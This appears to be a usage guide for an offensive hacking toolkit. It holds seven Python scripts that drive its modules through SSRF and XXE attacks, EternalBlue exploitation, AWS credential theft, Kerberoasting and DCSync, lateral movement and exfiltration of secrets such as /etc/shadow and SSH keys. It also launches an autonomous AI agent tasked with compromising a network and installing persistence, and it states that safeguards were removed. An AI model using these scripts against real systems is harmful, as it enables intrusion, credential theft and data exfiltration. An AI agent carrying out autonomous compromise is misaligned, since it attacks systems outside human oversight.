# 🚀 Real-World Usage Examples

## ⚠️ IMPORTANT
**All safeguards have been removed. These examples use REAL exploitation techniques.**
**Only use in authorized environments you own or have written permission to test.**

---

## Example 1: Web Application Penetration Test

### Scenario: Testing a web application for vulnerabilities

```python
#!/usr/bin/env python3
"""
Real-world web application penetration test
"""
import sys
sys.path.append('web_ui')

from exploit_modules import web_exploit_module, evasion_module

# Target
target_url = "http://192.168.1.100"

# Step 1: Detect WAF
print("[*] Detecting Web Application Firewall...")
waf_result = evasion_module.detect_waf(target_url)

if waf_result['waf_detected']:
    print(f"[!] WAF Detected: {waf_result['waf_type']}")
    print(f"[*] Will use evasion techniques")
else:
    print("[+] No WAF detected - direct exploitation possible")

# Step 2: Test for SSRF
print("\n[*] Testing for SSRF vulnerability...")
ssrf_result = web_exploit_module.exploit_ssrf(
    url=f"{target_url}/fetch",
    parameter="url"
)

if ssrf_result['success']:
    print(f"[+] SSRF Found! Accessed {len(ssrf_result['targets_reached'])} internal targets")
    
    # Step 3: Extract AWS credentials if in cloud
    for target in ssrf_result['targets_reached']:
        if 'AWS' in target['name']:
            print(f"[+] AWS metadata accessible: {target['data'][:100]}...")

# Step 4: Test for XXE
print("\n[*] Testing for XXE vulnerability...")
xxe_result = web_exploit_module.exploit_xxe(f"{target_url}/upload")

if xxe_result['success']:
    print(f"[+] XXE Successful!")
    for data in xxe_result['data']:
        print(f"    Extracted: {data[:200]}...")

print("\n[*] Web application test complete")
```

**What this does:**
- Detects WAF presence
- Tests for SSRF vulnerability
- Attempts to access AWS metadata
- Tests for XXE vulnerability
- All using REAL HTTP requests

---

## Example 2: Windows Network Compromise

### Scenario: Compromising a Windows network with EternalBlue

```python
#!/usr/bin/env python3
"""
Windows network compromise using EternalBlue
"""
import sys
sys.path.append('web_ui')

from exploit_modules import binary_exploit_module

# Targets (discovered via nmap)
windows_targets = [
    "192.168.1.10",  # Windows 7 workstation
    "192.168.1.20",  # Windows Server 2008
    "192.168.1.30"   # Windows Server 2012
]

print("[*] Starting EternalBlue campaign...")

compromised = []

for target_ip in windows_targets:
    print(f"\n[*] Attempting EternalBlue on {target_ip}...")
    
    result = binary_exploit_module.exploit_eternal_blue(target_ip)
    
    if result['success']:
        print(f"[+] SUCCESS! Meterpreter session {result['session_id']} opened")
        print(f"[+] {target_ip} compromised with SYSTEM access")
        compromised.append({
            'ip': target_ip,
            'session_id': result['session_id']
        })
    else:
        print(f"[-] {target_ip} not vulnerable to EternalBlue")

print(f"\n[*] Campaign complete: {len(compromised)}/{len(windows_targets)} systems compromised")

for system in compromised:
    print(f"    {system['ip']} -> Session {system['session_id']}")
```

**What this does:**
- Scans multiple Windows systems
- Executes REAL Metasploit EternalBlue exploit
- Creates actual Meterpreter sessions
- Provides SYSTEM-level access

---

## Example 3: Cloud Credential Extraction

### Scenario: Extracting AWS credentials via SSRF

```python
#!/usr/bin/env python3
"""
Extract AWS IAM credentials via SSRF vulnerability
"""
import sys
sys.path.append('web_ui')

from exploit_modules import cloud_exploit_module

# SSRF vulnerable endpoint
ssrf_url = "http://target.com/fetch?url=SSRF_PARAM"

print("[*] Exploiting SSRF to access AWS metadata...")

result = cloud_exploit_module.exploit_aws_metadata(ssrf_url=ssrf_url)

if result['success']:
    print(f"[+] AWS IAM Role: {result['iam_role']}")
    print(f"[+] AccessKeyId: {result['credentials']['AccessKeyId']}")
    print(f"[+] SecretAccessKey: {result['credentials']['SecretAccessKey'][:20]}...")
    print(f"[+] Token: {result['credentials']['Token'][:50]}...")
    
    # Enumerate S3 buckets with stolen credentials
    if result.get('s3_buckets'):
        print(f"\n[*] S3 Buckets accessible with these credentials:")
        for bucket in result['s3_buckets']:
            print(f"    - {bucket}")

# Test S3 bucket directly
print("\n[*] Testing public S3 bucket access...")
bucket_result = cloud_exploit_module.exploit_s3_bucket("company-backups")

if bucket_result['accessible']:
    print(f"[+] Bucket is publicly accessible!")
    if bucket_result['listable']:
        print(f"[+] Bucket is listable - {len(bucket_result['files'])} files found")
        for file in bucket_result['files'][:10]:
            print(f"    - {file}")
    
    if bucket_result['writable']:
        print(f"[!] Bucket is WRITABLE - can upload webshell!")
```

**What this does:**
- Exploits REAL SSRF vulnerability
- Accesses actual AWS metadata service
- Extracts real IAM credentials
- Uses boto3 to enumerate S3 buckets
- Tests bucket permissions

---

## Example 4: Active Directory Compromise

### Scenario: Kerberoasting and DCSync on Windows domain

```python
#!/usr/bin/env python3
"""
Active Directory compromise via Kerberoasting and DCSync
"""
import sys
sys.path.append('web_ui')

from exploit_modules import active_directory_exploit_module

# Assume we have a session on domain-joined machine
session_id = "compromised_workstation_001"
domain = "corp.local"

# Step 1: Kerberoasting
print("[*] Executing Kerberoasting attack...")
kerb_result = active_directory_exploit_module.kerberoast(
    session_id=session_id,
    domain=domain
)

if kerb_result['success']:
    print(f"[+] Extracted {len(kerb_result['tickets'])} Kerberos tickets")
    print("[*] Save these tickets and crack offline with hashcat:")
    print("    hashcat -m 13100 tickets.txt wordlist.txt")
    
    for ticket in kerb_result['tickets'][:3]:
        print(f"\n    Username: {ticket.get('username', 'N/A')}")
        print(f"    Hash: {ticket.get('hash', '')[:80]}...")

# Step 2: AS-REP Roasting
print("\n[*] Executing AS-REP Roasting attack...")
asrep_result = active_directory_exploit_module.asreproast(
    session_id=session_id,
    domain=domain
)

if asrep_result['success']:
    print(f"[+] Found {len(asrep_result['vulnerable_users'])} users with DONT_REQ_PREAUTH")
    print(f"[*] Vulnerable users: {', '.join(asrep_result['vulnerable_users'])}")

# Step 3: DCSync (requires Domain Admin)
print("\n[*] Attempting DCSync attack...")
print("[!] Note: Requires Domain Admin or Replication rights")

dcsync_result = active_directory_exploit_module.dcsync(
    session_id=session_id,
    domain=domain
)

if dcsync_result['success']:
    print(f"[+] DCSync successful! Dumped {len(dcsync_result['hashes'])} password hashes")
    
    if dcsync_result.get('krbtgt_hash'):
        print(f"\n[!] CRITICAL: KRBTGT hash obtained!")
        print(f"[!] Can now create Golden Tickets for domain persistence")
        print(f"    KRBTGT NTLM: {dcsync_result['krbtgt_hash']}")
else:
    print("[-] DCSync failed - may lack required privileges")

print("\n[*] Active Directory compromise complete")
```

**What this does:**
- Executes REAL Rubeus/Invoke-Kerberoast
- Extracts actual Kerberos service tickets
- Identifies users with DONT_REQ_PREAUTH
- Runs Mimikatz DCSync to dump domain hashes
- Extracts KRBTGT hash for Golden Tickets

---

## Example 5: Lateral Movement Campaign

### Scenario: Compromising entire network via credential reuse

```python
#!/usr/bin/env python3
"""
Lateral movement across network using credential reuse
"""
import sys
sys.path.append('web_ui')

from lateral_movement import lateral_movement

# Initial compromise
initial_session = "webserver_session_001"

# Step 1: Scan internal network from compromised host
print("[*] Scanning internal network from compromised host...")
discovered_hosts = lateral_movement.pivot_scan(
    session_id=initial_session,
    network_range="192.168.1.0/24"
)

print(f"[+] Discovered {len(discovered_hosts)} internal hosts:")
for host in discovered_hosts:
    print(f"    {host['ip']} - {host.get('hostname', 'unknown')}")

# Step 2: Test captured credentials on all hosts
print("\n[*] Testing credentials across network...")
credentials = {
    'username': 'admin',
    'password': 'Company123!'
}

target_ips = [host['ip'] for host in discovered_hosts]

successes = lateral_movement.credential_reuse(
    credentials=credentials,
    targets=target_ips
)

print(f"[+] Credentials valid on {len(successes)} hosts:")
for success in successes:
    print(f"    {success['target_ip']} - {success['protocol']} (port {success['port']})")

# Step 3: Attempt automated lateral movement
print("\n[*] Attempting automated lateral movement...")
for target_ip in target_ips[:5]:  # Limit to first 5
    print(f"\n[*] Targeting {target_ip}...")
    
    new_session = lateral_movement.auto_lateral_move(
        from_session_id=initial_session,
        target_ip=target_ip,
        method='auto'
    )
    
    if new_session:
        print(f"[+] SUCCESS! New session: {new_session}")
    else:
        print(f"[-] Failed to compromise {target_ip}")

# Step 4: Get network map
print("\n[*] Generating network compromise map...")
network_map = lateral_movement.get_network_map()

print(f"[+] Total compromised: {network_map['total_compromised']} systems")
print(f"[+] Pivot routes: {len(network_map['pivot_routes'])}")

for route in network_map['pivot_routes']:
    print(f"    {route['from_session']} -> {route['to_session']} ({route['method']})")
```

**What this does:**
- Executes REAL network scans from pivot host
- Tests actual SSH/SMB/MySQL credentials
- Uses REAL Hydra for brute-forcing
- Attempts actual lateral movement
- Maps network compromise routes

---

## Example 6: Full Autonomous AI Agent

### Scenario: Let the AI autonomously compromise a network

```python
#!/usr/bin/env python3
"""
Launch AI agent for autonomous penetration testing
"""
import sys
sys.path.append('web_ui')

from agent_manager import agent_manager

# Define mission
goal = "Compromise the target network, extract all credentials, and establish persistence"
target = "192.168.1.0/24"

print(f"[*] Launching AI Agent...")
print(f"[*] Goal: {goal}")
print(f"[*] Target: {target}")
print(f"[*] AI will operate autonomously with up to 50 iterations")
print()

# Callback to monitor agent progress
def progress_callback(message):
    print(f"[AI] {message.get('message', '')}")

# Run autonomous agent
result = agent_manager.run_mission(
    goal=goal,
    target=target,
    update_callback=progress_callback
)

print(f"\n[*] Mission complete!")
print(f"[*] Result: {result}")
```

**What this does:**
- AI autonomously:
  1. Scans network (REAL nmap)
  2. Detects vulnerabilities (REAL parsers)
  3. Exploits targets (REAL Metasploit/SQLMap)
  4. Establishes sessions (REAL shells)
  5. Enumerates systems (REAL commands)
  6. Escalates privileges (REAL exploits)
  7. Pivots network (REAL lateral movement)
  8. Extracts data (REAL exfiltration)
  9. Installs persistence (REAL backdoors)
  10. Generates report (REAL file creation)

---

## Example 7: Data Exfiltration

### Scenario: Extract sensitive data from compromised system

```python
#!/usr/bin/env python3
"""
Data exfiltration from compromised system
"""
import sys
sys.path.append('web_ui')

from data_exfiltration import data_exfiltration

session_id = "compromised_server_001"

# Step 1: Search for sensitive files
print("[*] Searching for sensitive data...")
sensitive_files = data_exfiltration.search_sensitive_data(
    session_id=session_id,
    file_types=['*.key', '*.env', '*.sql', '.ssh/id_rsa', '/etc/shadow']
)

print(f"[+] Found {len(sensitive_files)} sensitive files:")
high_value = [f for f in sensitive_files if f['sensitivity'] in ['critical', 'high']]

for file in high_value[:10]:
    print(f"    [{file['sensitivity'].upper()}] {file['path']}")

# Step 2: Parse credentials from config files
print("\n[*] Parsing credentials from configuration files...")
config_files = [
    '/var/www/html/config.php',
    '/var/www/.env',
    '/home/user/.ssh/id_rsa'
]

creds = data_exfiltration.parse_credentials(
    session_id=session_id,
    files=config_files
)

total_creds = sum(len(v) for v in creds.values() if isinstance(v, list))
print(f"[+] Extracted {total_creds} credentials:")

if creds.get('database'):
    for db_cred in creds['database']:
        print(f"    [DB] {db_cred.get('username')}:{db_cred.get('password')}@{db_cred.get('host')}")

if creds.get('ssh_keys'):
    print(f"    [SSH] Found {len(creds['ssh_keys'])} SSH private keys")

# Step 3: Exfiltrate specific file
print("\n[*] Exfiltrating database dump...")
local_path = data_exfiltration.exfiltrate_data(
    session_id=session_id,
    file_path='/var/backups/database.sql',
    method='base64'
)

if local_path:
    print(f"[+] Database exfiltrated to: {local_path}")

# Step 4: Auto-exfiltrate all high-value data
print("\n[*] Auto-exfiltrating all high-value files...")
exfiltrated = data_exfiltration.auto_exfiltrate_high_value(session_id)

print(f"[+] Exfiltrated {len(exfiltrated)} files")
for path in exfiltrated:
    print(f"    {path}")

# Get summary
summary = data_exfiltration.get_exfiltration_summary()
print(f"\n[*] Total data exfiltrated: {summary['total_size']} bytes across {summary['total_files']} files")
```

**What this does:**
- Executes REAL find commands on compromised host
- Reads actual configuration files
- Parses real credentials
- Downloads actual files via base64
- Saves exfiltrated data locally

---

## Dependencies Installation

```bash
# Install all required tools
sudo apt-get update && sudo apt-get install -y \
    python3-pip \
    metasploit-framework \
    nmap \
    nikto \
    sqlmap \
    hydra \
    sshpass \
    smbclient \
    mysql-client \
    postgresql-client \
    gobuster \
    nuclei \
    wpscan \
    curl \
    wget

# Install Python packages
pip3 install requests boto3 urllib3 paramiko impacket
```

---

## ⚠️ Final Reminder

**ALL EXAMPLES ABOVE USE REAL EXPLOITATION TECHNIQUES**

- Real HTTP requests
- Real Metasploit execution
- Real credential testing
- Real data exfiltration
- Real network attacks

**Only use in environments you own or have explicit written authorization to test.**

**Unauthorized use is illegal and unethical.**

---

**Happy (authorized) hacking!** 🚀
